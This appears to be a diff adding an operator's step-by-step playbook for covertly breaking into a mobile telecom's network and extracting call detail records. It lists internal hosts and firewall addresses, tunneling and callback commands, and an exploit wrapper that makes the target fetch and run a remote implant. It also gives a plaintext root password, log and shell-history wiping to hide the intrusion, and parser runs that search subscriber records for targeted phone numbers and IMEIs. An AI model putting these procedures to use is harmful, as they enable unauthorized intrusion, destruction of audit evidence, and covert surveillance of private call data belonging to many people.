@@ -1,0 +1,1217 @@
+#### SICKLESTAR stuff
+
+	# WINDOWS:
+	10.140.0.7	lhedc1
+	10.20.20.156	cs02.mobilink.net.pk
+	10.20.20.152	fs01.mobilink.net.pk
+        10.150.20.13    fs1
+        202.163.69.183  blade1  internal IP 10.140.0.9  (newest access)
+
+	# SOLARIS:
+	10.140.0.40	alien.mobillink.net
+	10.140.0.68	magnum.mobilink.net.pk
+	10.171.2.50	server-vas-i10.mobilink.net.pk
+	10.175.20.10	spots.mibilink.net.pk
+
+	# HP
+        10.211.20.11    CG1.mobilink.net.pk
+	10.211.4.1	CDRCOL1.mobilink.net.pk
+	10.211.4.2	CDRCOL2.mobilink.net.pk
+
+	# PIX:
+	202.163.69.185	pix525	(main)
+	202.163.69.??		(backup)
+	
+	keys in /targets/sicklestar/keys
+
+
+
+### Helpful in weeding out noisiness in ethwarn window:
+echo "igmp" >> /tmp/filters.inuse && mv /tmp/filters.inuse /tmp/filters
+echo "pathcost" >> /tmp/filters.inuse && mv /tmp/filters.inuse /tmp/filters
+echo "who-has" >> /tmp/filters.inuse && mv /tmp/filters.inuse /tmp/filters
+echo "router" >> /tmp/filters.inuse && mv /tmp/filters.inuse /tmp/filters
+echo "arp reply" >> /tmp/filters.inuse && mv /tmp/filters.inuse /tmp/filters
+echo "NetBeui" >> /tmp/filters.inuse && mv /tmp/filters.inuse /tmp/filters
+
+
+
+
+
+################################################################################
+### USUAL for your opnotes:
+
+pitch							PITCHIMPAIR
+->10.171.2.50           server-vas-i10.mobilink.net.pk  SICKLESTAR (unix)
+-->10.140.0.40          alien.mobilink.net.pk           SICKLESTAR (unix)
+--->10.211.4.1          CDRCOL1.mobilink.net.pk         SICKLESTAR (unix)
+-->10.140.0.7		lhedc1.mobilink.net.pk		SICKLESTAR (windows)
+--->10.20.20.156        cs02.mobilink.net.pk            SICKLESTAR (windows)
+---->10.20.20.152       fs01.mobilink.net.pk            SICKLESTAR (windows)
+
+10.171.2.50
+-----------
+# try one of the following:
+# old way, may not work on new machines (and vary the -s port with: 8181 8204 8081 8104):
+
+-irtun 10.171.2.50 8104 -uec -F pix -Y -sp -G 202.163.69.185
+
+# else try this (no mods needed to tn.spayed) and vary the -s port with: 8181 8204 8081 8104:
+
+-irtun 202.163.69.185 RANDOM -uec -F pix -Y -s 8204
+
+
+
+10.140.0.40
+-----------
+-irtun 10.140.0.40 28374 -ueY
+
+10.211.4.1
+-----------
+exploited with YS; cleaned up;
+pulled CDRs w/ CURSEHYDRANT
+################################################################################
+
+
+#### 1. Connect to PITCH
+	
+POSSIBLE ACCESS methods:
+
+	DD to server-vas10
+	   redirect for windows portion (if any)
+	   irtun to alien via DD
+		whack HP (CDRCOL1 or 2)
+
+### OPTION 2:
+        DD  to server-vas10
+		whack HP (CG1) via server-vas
+			whack HP (CDRCOL1 or 2) via CG1
+
+### OPTION 3:
+	DD  to server-vas
+		redirect to windows (fs1)
+		whack HP via server-vas or other Solaris
+		
+	
+### USE IF problem with PC callback:
+	set up tunnels on PIX (use opscript.benignflutter on zip disk and bf_tunnels.5oct for reference)
+		connect to 10.140.0.7	lhrdc1	(windows 24-hr PC)	
+			redirect IN to any Solaris (alien, server-vas, or magnum)
+				whack HP
+
+### OLD: if no problem with PC callback & McAfee:
+        connect to blade1
+                redirect IN to alien
+                        whack HP
+
+	
+
+
+
+
+
+
+#### 2. Connect to Solaris target behind pix, else tunnel from PITCH to WINDOWS target if possible:
+#firewall will allow these ports out: 8181 8204 8081 8104
+
+-irtun 10.171.2.50 8104 -uec -F pix -Y -sp -G 202.163.69.185
+
+
+#### else try this (no mods needed to tn.spayed) and vary the -s port with: 8181 8204 8081 8104:
+
+-irtun 202.163.69.185 RANDOM -uec -F pix -Y -s 8204
+
+
+
+
+
+
+
+
+#### 3. Is there a WINDOWS portion to the OP?  If so continue here, if not, go to STEP 4.
+
+#### 3a. Connect from server-vas10 (10.171.2.50) to spots if necessary (10.175.20.10), then redirect to windows:
+
+-irtun 10.175.20.10 RANDOM -ue
+
+
+
+
+
+
+
+#### 3b. Then set up tunnels for the windows portion:
+-tunnel
+l 1188 10.140.0.7
+#l 1188 10.150.20.13
+#l 1630 10.150.20.13
+
+	10.140.0.7	lhrdc1
+	# old:
+        10.150.20.13    fs1
+	202.163.69.183	blade1  internal IP 10.140.0.9  (newer access)
+        202.165.247.89  blade   internal IP 10.140.0.9
+
+
+
+
+
+
+
+#### 3a. Old method to get to alien:
+#### 3a. Windows redirects INCISION trigger to alien (10.140.0.40) and defaults to callback mode
+####    however, you can start nopen in listening mode once there and -exit the callbacks
+
+
+	##################  SENDING TRIGGER THRU WINDOWS (2000 or XP) BOX ##########################
+	#####  NT4.0 doesn't allow the use of raw sockets, which is needed to send the IN trigger ##
+mx
+:%s/LOCAL_WINDOWS_IP/LOCAL_WINDOWS_IP/g
+:%s/LOCAL_UNIX_IP/LOCAL_UNIX_IP/g
+:%s/UNIX_INCISION_TRIGGER_PORT/UNIX_INCISION_TRIGGER_PORT/g
+:%s/INCISION_CALLBACK_PORT/INCISION_CALLBACK_PORT/g
+:%s/NOPEN_CALLBACK_PORT/NOPEN_CALLBACK_PORT/g
+
+:%s/WIN_TARG_INTERNAL_IP/10.140.0.9/g
+:%s/TARGET_IP/10.140.0.40/g
+
+`x
+	
+## Usage: script unixredirect.eps LOCAL-WINDOWS-IP LOCAL-UNIX-IP UNIX-INCISION-TRIGGER-PORT INCISION-CALLBACK-PORT NOPEN-CALLBACK-PORT
+
+script unixredirect.eps LOCAL_WINDOWS_IP LOCAL_UNIX_IP UNIX_INCISION_TRIGGER_PORT INCISION_CALLBACK_PORT NOPEN_CALLBACK_PORT
+
+	### or run the following by hand
+
+	
+	### On Windows box #####################
+	
+	# Note: can use 'background' instead of 'monitor' in the windows commands
+	
+	# This sends the trigger:
+	# monitor packetredirect -packettype udp -listenport LOCAL-PORT -bind LOCAL-WIN-IP
+	# Ex. - monitor packetredirect -packettype tcp -listenport 32654 -bind DOOBIEIP
+	
+	monitor packetredirect -packettype udp -listenport LOCAL_PORT -bind LOCAL_WIN_IP
+	
+	
+	
+	# This listens for the ish callback
+	# monitor redirect -tcp -implantlisten ISH-CALLBACK-PORT -target LOCAL-LINUX-IP ISH-CALLBACK-PORT 
+	# Ex. - monitor redirect -tcp -implantlisten 28345 -target FIREBALL_IP 28345 
+	
+	monitor redirect -tcp -implantlisten ISH_CALLBACK_PORT -target LOCAL_LINUX_IP ISH_CALLBACK_PORT 
+	
+	
+	
+	# For nopen connection:
+	# monitor redirect -tcp -lplisten RAT-PORT
+	# Ex. - monitor redirect -tcp -lplisten 47108
+	
+	monitor redirect -tcp -lplisten RAT_PORT -target TARGET_IP RAT_PORT -bind LOCAL_WIN_IP
+	
+	
+	
+	# For additional nopen connections, increment the lplisten port, but keep the same target nopen port:
+	# monitor redirect -tcp -lplisten RAT-PORT+1 -target TARGET-IP RAT-PORT -bind LOCAL-WIN-IP
+	# Ex. - monitor redirect -tcp -lplisten 47109 -target 10.1.1.3 47108 -bind 10.1.1.2
+	
+	monitor redirect -tcp -lplisten RAT_PORT+1 -target TARGET_IP RAT_PORT -bind LOCAL_WIN_IP
+	
+	
+	
+	
+	### On Linux box: #####################
+	
+	 
+	# Once the first three windows commands are set up, you can send the trigger:
+	# ourtn -W LOCAL-WIN-IP:LOCAL-PORT -o RAT-PORT -p ISH-CALLBACK-PORT -i WIN-TARG-IP -ue TARGET-IP
+	# Ex: ourtn  -W DOOBIE_IP:32654 -o 47108 -p 28345 -i 10.1.1.4 -ue 10.1.1.3
+	
+	#ourtn -W LOCAL_WIN_IP:LOCAL_PORT -o RAT_PORT -p ISH_CALLBACK_PORT -i WIN_TARG_IP -ue TARGET_IP
+	#ourtn -W 192.168.254.253:31413 -O 41611 -C 202.154.225.27 -p 37541 -i 202.154.225.27 -ue 10.140.0.40
+	
+	#ourtn -ueW 192.168.254.253:31413 -i 202.154.225.27 -C 202.154.225.27 -p 37541 -O 41611 10.140.0.40
+	TRAVOLTA=1 ourtn -ueW 192.168.254.22:8942 -i 10.140.0.9 -C 10.140.0.9 -p 18855 -O 7549 10.140.0.40
+
+### Use the TRAVOLTA option to keep nopen from dying in 5 hours, only if you think the op will be extended
+### If alien has issues with an nfs mount point, so use the "-Q" option to ourtn and DO NOT run the following
+###     -lt /, df -k, otherwise, you'll tie up your window and will need to kill the process;
+###     it's better NOT to run nopen built-ins on alien so that you can kill something if it hangs
+
+incision trigger = UNIX_INCISION_TRIGGER_PORT
+incision callback = INCISION_CALLBACK_PORT
+nopen callback = NOPEN_CALLBACK_PORT
+
+	
+#ourtn -ueW 192.168.254.142:36541 -i 10.140.0.9 -C 10.140.0.9 -p 34789 -O 45665 10.140.0.40
+#ourtn -ueW LOCAL-WIN-IP:LOCAL-PORT -i WIN-TARG-IP -C WIN-TARG-INTERNAL-IP -p ISH-CALLBACK-PORT -O RAT-PORT TARGET-IP
+ourtn -ueW LOCAL_WINDOWS_IP:UNIX_INCISION_TRIGGER_PORT -i WIN_TARG_INTERNAL_IP -C WIN_TARG_INTERNAL_IP -p INCISION_CALLBACK_PORT -O NOPEN_CALLBACK_PORT TARGET_IP
+
+noclient -l NOPEN_CALLBACK_PORT
+#noclient -l 45665
+
+
+	#  Call forward to nopen works to alien, start a -listen PORT to call forward
+	#  Set up redirectors on windows side to allow the following connections:
+
+mx
+:%s/NOPEN_CALLFORWARD_PORT/NOPEN_CALLFORWARD_PORT/g
+'x
+
+
+# on windows side:
+background redirect -tcp -lplisten NOPEN_CALLFORWARD_PORT -target TARGET_IP NOPEN_CALLFORWARD_PORT -bind LOCAL_WINDOWS_IP
+background redirect -tcp -lplisten NOPEN_CALLFORWARD_PORT+1 -target TARGET_IP NOPEN_CALLFORWARD_PORT -bind LOCAL_WINDOWS_IP
+background redirect -tcp -lplisten NOPEN_CALLFORWARD_PORT+2 -target TARGET_IP NOPEN_CALLFORWARD_PORT -bind LOCAL_WINDOWS_IP
+
+	
+-listen NOPEN_CALLFORWARD_PORT
+noclient LOCAL_WINDOWS_IP:NOPEN_CALLFORWARD_PORT
+#noclient LOCAL_WINDOWS_IP:NOPEN_CALLFORWARD_PORT+1
+#noclient LOCAL_WINDOWS_IP:NOPEN_CALLFORWARD_PORT+2
+
+	
+	
+	#### To kill one server first use it to start a new one (new one won't burn)
+	D=-l23477 PATH=. sendmail
+	-burnBURN
+	
+	
+	# Connect to nopen; suggest using the port override option (-o) above for simplicity
+	# For additional windows, you and the windows person must increment the redirected port
+	# Ex. - noclient 10.1.1.2:47108
+	# Ex. - noclient 10.1.1.2:47109
+	
+	#noclient 10.1.1.2:RAT_PORT+1
+	
+
+
+
+
+
+
+#### 4. Connect to alien 10.140.0.40
+
+-irtun 10.140.0.40 RANDOM -ueY
+	
+
+
+
+
+
+	
+	
+#### 5. whack HP  CDRCOL1 (10.211.4.1) or CDRCOL2 (10.211.4.2) 
+####     with YS or telnet masquerade 
+####	you should find out which target is currently storing CDRs
+####    and which exploit is acceptable to use
+
+###
+### NEW -- see TELNET section below if telnet masqerade is needed
+###
+
+#########################################################
+### YELLOW
+#########################################################
+
+mx
+:%s/HP_IP/HP_IP/g
+:%s/REDIR_IP/REDIR_IP/g
+:%s/XSERVER_PORT/XSERVER_PORT/g
+:%s/NETCAT_PORT/NETCAT_PORT/g
+'x
+
+### Netcat Window:
+# packrat
+cp /current/up/morerats/noserver-3.0.3.1-hppa2.0w.hp.hpux-11.00 /current/up/noserver
+packrat -n /current/bin/nc.YS nscd NETCAT_PORT
+
+-tunnel
+u 177 HP_IP
+r NETCAT_PORT
+r XSERVER_PORT
+
+### Locally:
+# check wrap-hpux.sh;  _piping_ to uudecode doesn't work as well as writing to a file then uudecoding the file
+# should look like this:
+#VENDOR_STR="\`mkdir ${DIR} 2>&1;cd ${DIR} 2>&1 && /usr/bin/telnet ${LOCAL_IP} ${CALLBACK_PORT} 2>&1 </dev/console > ${RAT}.uu; uudecode ${RAT}.uu 2>&1 > /dev/null 2>&1 && uncompress -f ${RAT}.Z;chmod 0700 ${RAT} && export PATH=.; ${RAT} \`"
+
+cat wrap-hpux.sh
+
+### Local scripted window #1:
+### upload nopen as "nscd" in /tmp/.scsi
+./wrap-hpux.sh -h
+
+#./wrap-hpux.sh -l REDIR-IP -r nscd -p NETCAT-PORT -x XSERVER-PORT -d /tmp/.scsi 
+#./wrap-hpux.sh -l 10.140.0.40 -r nscd -p 38442 -x 40193 -d /tmp/.scsi 
+./wrap-hpux.sh -l REDIR_IP -r nscd -p NETCAT_PORT -x XSERVER_PORT -d /tmp/.scsi 
+
+
+### Local scripted window #2:
+./xc -h
+#./xc  -s REDIR-IP -x REDIR-IP -y XSERVER-PORT 127.0.0.1
+#./xc  -s 10.140.0.40 -x 10.140.0.40 -y 40193 127.0.0.1
+./xc  -s REDIR_IP -x REDIR_IP -y XSERVER_PORT 127.0.0.1
+
+### Netcat Window:
+# control-c the netcat window before the nstun to target
+
+
+### Nopen alien window:
+# connect to HP from alien
+-nstun HP_IP
+
+
+### Cleanup YS remains
+
+#### Here are some samples
+## Killing the processes
+ps -ef 
+
+ps -ef | egrep "dtlogin|xrdb|display"
+
+## Don't kill legitimate dtlogins  - check the timestamps; yours will be current!!!!
+kill -9 DTLOGINPID [DTLOGINCHILDPID...]
+
+ps -ef |grep #timestamp
+
+## Remnants in /var/dt, samples
+-lt /var/dt
+rm /var/dt/dtlogin_*
+-lt /var/dt/Xerrors
+-get /var/dt/Xerrors
+-tail /var/dt/Xerrors
+cat /dev/null > /var/dt/Xerrors
+touch -r /var/dt/Xpid /var/dt/Xerrors
+touch -r /var/dt/Xpid /var/dt
+
+## toast /var/adm & /etc (on HP)
+-put /current/up/toast t
+./t -u /var/adm/wtmp | tail -20
+./t -u /var/adm/wtmp DEVICE TIME
+
+./t -u /etc/utmp
+./t -x /etc/utmpx | tail -20
+
+
+-rm t
+
+-rm nscd.uu
+
+
+
+
+
+#########################################################
+### TELNET MASQ
+#########################################################
+
+### alien
+-tunnel
+l 2323 10.211.4.1 23
+
+### local window
+cd /current/up
+packrat nscd
+control c
+gedit nscd.Z.uu &
+
+### local scripted window #### WARNING - You'll be logged in /root/.sh_history regardless!!!
+telnet 127.0.0.1 2323
+root
+ACD*1
+
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+w
+id
+mkdir /tmp/.scsi;cd /tmp/.scsi;pwd
+uudecode; ls -la
+uncompress nscd.Z; ls -la
+chmod 700 nscd
+PATH=. nscd
+exit
+
+
+-nstun 10.211.4.1
+
+### Cleanup from telnet masq
+### run toast & pull back /root/.sh_history, edit our lines, then put back between root activity
+
+-vget /root/.sh_history
+
+###locally
+cp /current/down/CDRCOL1.10.211.4.1/root/.sh_history /current/up/sh_history
+cd /current/up
+vi sh_history
+
+-put /current/up/sh_history s
+w
+-lt /root
+cat s > /root/.sh_history
+w
+-lt /root
+-vget /root/.sh_history
+-rm s
+
+### toast /var/adm and /etc
+-lt /var/adm /etc
+-put /current/up/toast t
+
+./t -u /var/adm/wtmp
+./t -u /etc/utmp
+./t -x /etc/utmpx
+
+-rm t
+
+
+
+
+
+
+###########################################################################
+### WEARCUP
+### Upload and run cup (as snmpdm) to clean up the working directory on HPs
+### At the end of the op, use -exit (DON'T BURN, YOU MUST USE -exit)
+
+-gs wearcup -h
+-gs wearcup -r snmpdm -w 4h
+# follow instructions (sleep time is in seconds)
+#	10800 = 3 hours
+#      	 7200 = 2 hours
+#	  120 = 2 minutes
+ps -ef | grep sleep
+
+
+#### to run cup by hand, edit /current/up/cup.DEPRECATED.SEE.README.cup.NOPEN
+####  to reflect the following:
+
+	#!/bin/sh
+	DIR=/tmp/.scsi
+	cd /
+	rm $DIR/cup
+	trap : TERM
+	exec >&- 2>&-
+	sleep 60
+	/usr/sbin/fuser -k $DIR/*
+	rm -rf $DIR
+
+	-put /current/up/cup.DEPRECATED.SEE.README.cup.NOPEN cup
+
+	-cat cup 
+
+	./cup &
+
+	ps -ef|grep sleep
+
+#### if you want to execute it immediately then kill the sleep
+kill -9 <sleep_pid>
+-exit  ##### DO NOT BURN!!!!!
+
+
+
+
+###########################################################
+# HP Kernel Checks 
+###########################################################
+
+# optional
+# run these to check target for kernel info for implants:
+
+/usr/bin/getconf SC_CPU_VERSION
+/usr/bin/getconf SC_KERNEL_BITS
+kmadmin -s
+
+swapinfo -t
+
+###############################################################################
+############### PARSING  ######################################################
+###############################################################################
+
+####### Prepare files containing numbers to search for:
+
+# argfiles
+mkdir /current/down/argfiles
+cd /current/down/argfiles
+tar xvf /dev/fd0 
+	# or
+mount /mnt/floppy
+ls -l /mnt/floppy
+cp /mnt/floppy/arg* /current/down/argfiles
+cd /current/down/argfiles
+ls -altr
+
+### make sure the files are ASCII and contain NO EMPTY LINES!!
+cat arg*
+file arg*
+dos2unix arg*
+file arg*
+
+# if no floppy is provided:
+# locally, create a file of numbers to grep for with each number on a separate line
+#       make sure there are NO EMPTY LINES!!!!
+# if searching for LACs and cell id's, use the format in the documentation:
+#	 ex. - 410 01 95 18374
+# if searching for phone numbers, use the normal format:
+# 	 ex. - 4837506
+
+
+vi /current/down/argfiles/argfile1.txt
+
+
+
+########## To look at CDR directories try the following:
+
+### about two weeks worth are kept in this directory:
+ls /share/a1338/ne_q3ic/nb/convert/output | wc -l
+ls /share/a1338/ne_q3ic/nb/convert/output | head -10
+ls /share/a1338/ne_q3ic/nb/convert/output | tail -10
+-ls /share/a1338/ne_q3ic/nb/convert/output/*dF* 
+
+### this is where they are backed up - this could be huge
+ls /share/a1338/ne_q3ic/nb/convert/backup | head -10
+ls /share/a1338/ne_q3ic/nb/convert/backup | tail -10
+ls /share/a1338/ne_q3ic/nb/convert/backup/TODO | head -10
+ls /share/a1338/ne_q3ic/nb/convert/backup/TODO | tail -10
+ls /share/a1338/ne_q3ic/nb/convert/backup/ahmad | head -10
+ls /share/a1338/ne_q3ic/nb/convert/backup/ahmad1 | head -10
+ls /share/a1338/ne_q3ic/nb/convert/backup/ahmad/sulaman | wc -l
+ls /share/a1338/ne_q3ic/nb/convert/backup/ahmad/temp | wc -l
+#-ls /share/a1338/ne_q3ic/nb/convert
+#-ls /share/a1338/ne_q3ic/nb/convert/backup/05041*dF* 
+
+### check out the history file to see if they've been removed
+-lt /root
+-vget /root/.sh_history
+
+
+
+################################################################################
+##########################  CURSEHYDRANT 4.2.1   ###############################
+################################################################################
+### NEW SYNTAX (CH4.2.1) can use encryption, and automaticly deletes argfile (to keep it, add -r flag)
+
+
+### Name the output file with the date of today's op (cdrhits.<TODAY'S DATE>.txt):
+
+mx
+:%s/DDMonYY/DDMonYY/g
+'x
+
+#### Using encryption:
+
+### Once the argfiles have been verified to be ASCII with no empty lines, encrypt them
+
+
+### create a 32 character hex RC6 key to use for the encryption and save it:
+### Trick - use md5sum on any file to create a "random" 32-bit hex number
+# ex: 1234567890abcdef1234567890abcdef
+
+md5sum /current/etc/opscript.txt
+
+mx
+:%s/CRYPTKEY/CRYPTKEY/g
+'x
+
+echo CRYPTKEY > /current/down/cryptkey.DDMonYY
+
+### Now, encrypt the ascii list:
+which /current/bin/cryptTool.v1.0.Linux2.4.18-14.targetdl
+#cp /mnt/zip/cryptTool.v1.0.Linux2.4.18-14.targetdl /current/bin
+
+/current/bin/cryptTool.v1.0.Linux2.4.18-14.targetdl -i argfile1.txt -o argfile1.enc -k CRYPTKEY -b
+/current/bin/cryptTool.v1.0.Linux2.4.18-14.targetdl -i argfile2.txt -o argfile2.enc -k CRYPTKEY -b
+
+file argfile*.enc
+
+### to encrypt all at the same time:
+
+for i in argfile* ; do /current/bin/cryptTool.v1.0.Linux2.4.18-14.targetdl -i $i -o `basename $i .txt`.enc -k CRYPTKEY -b ; done
+
+ls -l
+
+
+### Tips for running the CURSEHYDRANT 4.2.1
+
+	### DO NOT _APPEND_ to the local file if using encryption - (no >>L: or >>T: )!!!! 
+	###  	per each argfile, create .enc1, .enc1.more, .enc1.more2, etc if additional
+	###		passes are needed for the date range
+	### DO NOT use -o if also using >L: or >T: (mixed output corrupts the decryption)
+	### By default, the new CH expects a cryptokey: 
+	### 	to run in the clear, take out the -k KEY, add -w, replace -P with -p
+	### The phone list is deleted automatically now
+	
+
+### Suggested -z options:
+
+	### this looks in subdirs, so use caution in backup dir (can be good AND bad): 
+	### Also circumvents "parameter list too long" problem with wildcards with 'ls'
+	-z "find /share/a1338/ne_q3ic/nb/convert/output -name '0506132*dF*' -print"
+
+	### works, but only for smaller ranges
+	-z "ls -1rt /share/a1338/ne_q3ic/nb/convert/output/05110[3-6]*dF*"
+
+
+######## Upload the parser (CURSEHYDRANT) and called it lvmkd
+# put up the parser tool
+-put /current/up/cursehydrant.v4.2.1.HP-UXB.11.00.targetsl lvmkd
+
+        # or
+
+-put /mnt/zip/cursehydrant.v4.2.1.HP-UXB.11.00.targetsl lvmkd
+
+
+
+#####  Upload the encrypted phone list as nfskd, then run the parser:
+
+
+##### 1
+
+#-put /current/down/argfiles/argfile1.enc nfskd
+#export ENV_ARGS='-k CRYPTKEY -z "find /share/a1338/ne_q3ic/nb/convert/output -name '06051[3-4]*dF*' -print" -P ./nfskd'; ./lvmkd >T:/current/down/cdrhits.CDRCOL1.DDMonYY.enc1
+-beep 15
+
+#-put /current/down/argfiles/argfile1.enc nfskd
+#export ENV_ARGS='-k CRYPTKEY -z "find /share/a1338/ne_q3ic/nb/convert/output -name '06051*dF*' -print" -P ./nfskd'; ./lvmkd >T:/current/down/cdrhits.CDRCOL1.DDMonYY.enc1.more
+-beep 15
+
+
+##### 2
+
+
+#-put /current/down/argfiles/argfile2.enc nfskd
+#export ENV_ARGS='-k CRYPTKEY -z "find /share/a1338/ne_q3ic/nb/convert/output -name '06051[1-2]*dF*' -print" -P ./nfskd'; ./lvmkd >T:/current/down/cdrhits.CDRCOL1.DDMonYY.enc2
+-beep 15
+
+#-put /current/down/argfiles/argfile2.enc nfskd
+#export ENV_ARGS='-k CRYPTKEY -z "find /share/a1338/ne_q3ic/nb/convert/output -name '06051*dF*' -print" -P ./nfskd'; ./lvmkd >T:/current/down/cdrhits.CDRCOL1.DDMonYY.enc2.more
+-beep 15
+
+
+
+##### 3
+
+
+#-put /current/down/argfiles/argfile3.enc nfskd
+#export ENV_ARGS='-k CRYPTKEY -z "find /share/a1338/ne_q3ic/nb/convert/output -name '06051[0-6]*dF*' -print" -P ./nfskd'; ./lvmkd >T:/current/down/cdrhits.CDRCOL1.DDMonYY.enc3
+-beep 15
+
+
+#-put /current/down/argfiles/argfile3.enc nfskd
+#export ENV_ARGS='-k CRYPTKEY -z "find /share/a1338/ne_q3ic/nb/convert/output -name '06051[0-6]*dF*' -print" -P ./nfskd'; ./lvmkd >T:/current/down/cdrhits.CDRCOL1.DDMonYY.enc3.more
+-beep 15
+
+
+
+##### 4
+
+
+#-put /current/down/argfiles/argfile4.enc nfskd
+#export ENV_ARGS='-k CRYPTKEY -z "find /share/a1338/ne_q3ic/nb/convert/output -name '06051[0-6]*dF*' -print" -P ./nfskd'; ./lvmkd >T:/current/down/cdrhits.CDRCOL1.DDMonYY.enc4
+-beep 15
+
+
+#-put /current/down/argfiles/argfile4.enc nfskd
+#export ENV_ARGS='-k CRYPTKEY -z "find /share/a1338/ne_q3ic/nb/convert/output -name '06051[0-6]*dF*' -print" -P ./nfskd'; ./lvmkd >T:/current/down/cdrhits.CDRCOL1.DDMonYY.enc4.more
+-beep 15
+
+
+
+
+
+######
+#####  when it's done running, decrypt the file (-d -c options)
+######
+
+ls -latr cdr*enc*
+
+# to decrypt individually:
+
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i cdrhits.CDRCOL1.DDMonYY.enc1 -o cdrhits.CDRCOL1.DDMonYY.txt1 -k CRYPTKEY -d -c
+
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i cdrhits.CDRCOL1.DDMonYY.enc2 -o cdrhits.CDRCOL1.DDMonYY.txt2 -k CRYPTKEY -d -c
+
+
+# or decrypt all at one time (once all are written fully)
+
+cd /current/down
+for i in cdrhits*enc* ; do n="`echo $i | sed \"s,enc,txt,g\"`" ; cryptTool.v1.0.Linux2.4.18-14.targetdl -i $i -o $n -k CRYPTKEY -d -c ; done
+
+ls -latr cdr*txt*
+
+
+
+
+######
+######  to run parser in the clear (unencrypted):
+######
+
+-put /current/down/argfiles/argfile1.txt nfskd
+#export ENV_ARGS='-w -z "find /share/a1338/ne_q3ic/nb/convert/output -name '060501*dF*'  -print" -p ./nfskd'; ./lvmkd >T:/current/down/cdrhits.test
+-beep 15
+
+
+
+
+######
+######  to completely parse a range of files (no encryption & no particular number to search):
+######
+export ENV_ARGS='-o -w -d -z "ls -1rt /share/a1338/ne_q3ic/nb/convert/output/06051[1-2]*dF*"; ./lvmkd >T:/current/down/cdr.morenumbers
+
+
+
+
+######
+######  survey mode:
+######
+
+### checks for IMEIs that have more than one IMSI associated with it:
+### to limit amount of memory used, replace "-x" with "-X numberBytes"
+export ENV_ARGS='-x -k CRYPTKEY -z "ls -1rt /share/a1338/ne_q3ic/nb/convert/output/06051[1-2]*dF*"'; ./lvmkd >T:/current/down/surveyIMEI.DDMonYY.enc1
+
+
+
+
+
+### generates a list of Cell IDs associated with each MSC address:
+### to limit amount of memory used, replace "-y" with "-Y numberBytes"
+export ENV_ARGS='-y -k CRYPTKEY -z "ls -1rt /share/a1338/ne_q3ic/nb/convert/output/06051[1-2]*dF*"'; ./lvmkd >T:/current/down/surveyMSC.DDMonYY.enc1
+
+
+
+
+
+### locally, decrypt:
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i surveyIMEI.DDMonYY.enc1 -o surveyIMEI.DDMonYY.txt1 -k CRYPTKEY -d -c
+# or
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i surveyMSC.DDMonYY.enc1 -o surveyMSC.DDMonYY.txt1 -k CRYPTKEY -d -c
+
+
+
+
+
+######
+
+
+#####
+#####  clean up
+#####
+-rm lvmkd
+w
+ps -ef | sort
+-lt /
+
+
+
+
+#####
+#####  execute CUP to have it clean up nopen (see WEARCUP section)
+#####
+ps -ef |grep sleep
+kill -9 <pid>
+
+
+
+
+################################################################################
+###############################  ORLEANSSTRIDE   ###############################
+################################################################################
+
+
+## run this on magnum:
+
+mkdir /tmp/.scsi
+-cd /tmp/.scsi
+
+mx
+:%s/DDMonYY/DDMonYY/g
+'x
+
+-put /mnt/zip/ORLEANSSTRIDE/orleansstride.v1.0.SunOS5.8.targetsl more
+
+### make sure the numbers are SORTED (necessary for ORLEANSSTRIDE):
+vi /current/down/argfiles/argfile1.txt
+-put /current/down/argfiles/argfile1.txt awk
+
+### directories to try:
+/archive/cdrc
+/archive/cdrc/input/DONE/20050901*mob
+
+
+## run it (the argfile is automaticly deleted by the parser each time it runs):
+./more -w -o -p ./awk -z "find /archive/cdrc/input/DONE/20050901*mob -name '2005*mob' -print" >>T:/current/down/cdrhits.magnum.DDMonYY.txt
+# other syntax that should work:
+./more -w -o -p ./awk -z "ls -1 /archive/cdrc/input/DONE/20050901*mob" >>T:/current/down/cdrhits.magnum.DDMonYY.txt
+
+
+
+-put /current/down/argfiles/argfile2.txt awk
+./more -w -o -p ./awk -z "find /archive/cdrc -name '2005*mob' -print" >>T:/current/down/cdrhits.magnum.DDMonYY.txt
+
+
+-rm more awk
+-cd /tmp
+-rm .scsi
+
+
+
+
+
+
+#### To use encryption:
+
+
+####### Locally:
+### create an ascii list of numbers to search for and make sure it's sorted:
+vi argfile1
+
+### create a 32 character hex RC6 key to use for the encryption and save it:
+# ex: 12345678123456781234567812345678
+md5sum <somefile>
+
+echo CRYPTKEY > /current/down/cryptkey.DDMonYY
+
+### Now, encrypt the ascii list:
+
+/current/up/cryptTool.v1.0.Linux2.4.18-14.targetdl -i <ARGFILE> -o <ARGFILE.enc> -k <32charkey> -b
+
+file <ARGFILE.enc>
+
+####### On target:
+### upload ORLEANSSTRIDE to the target
+
+-put /current/up/orleansstride.v1.0.SunOS5.8.targetsl sendmail
+
+### upload encrypted argfile:
+
+-put /current/down/ARGFILES/<ARGFILE.enc> bd
+
+### run the parser:
+
+## This method not really prefered since key is in commandline
+./sendmail -o -k <32charkey> -P bd -z "find . -name '2005*' -print" -r >T:/current/down/cdrhits.mob.enc.DDMonYY
+
+### preferred method if using encryption (using 'find' in this method gave errors):
+
+export ENV_ARGS='-o -k CRYPTKEY -z "ls -1rt 2005*mob" -P ./bd'; ./sendmail >T:/current/down/cdrhits.mob.enc.DDMonYY
+
+
+### Locally, decrypt the cdrhits file
+
+cryptTool.v1.0.Linux2.4.18-14.targetdl -i /current/down/cdrhits.mob.enc.DDMonYY -o /current/down/cdrhits.mob.decr.DDMonYY -k <32charkey> -d -c
+
+cat /current/down/cdrhits.mob.decr.DDMonYY
+
+
+##############################################################################
+#### LEGACY commands
+
+
+	/mnt/zip/cdrprint -a /current/down/cdr.2Jun05.uniques.txt -f /current/down/cdrhits.chained.DDMonYY.txt > /current/down/cdrpretty3.DDMonYY.txt
+
+
+
+
+	perl -ne 'print "$1\n" if (m/Party \d\:\s+\d*(\d{10})/)' /current/down/cdrpretty.2Jun05.combined.txt | sort | uniq > /current/down/cdr.2Jun05.uniques.txt
+
+
+
+	:%s/^92//g
+	:%s/^111$//g
+	:%s/^9//g
+	:%s/^0+//g
+	:%s/^0//g
+	:%s/^.*00042$//g
+	:%s/^882//g
+	:%s/^.*060708//g
+	:%s/^.*0005150//g
+        :%s/^.*5031999//g
+
+	
+	
+	perl -ne 'print "$1\n" if (m/Party \d\:\s+\d*(\d{10})/)' cdrpretty.combined | sort | uniq
+	
+	-put /current/down/cdr.uniques nfskd
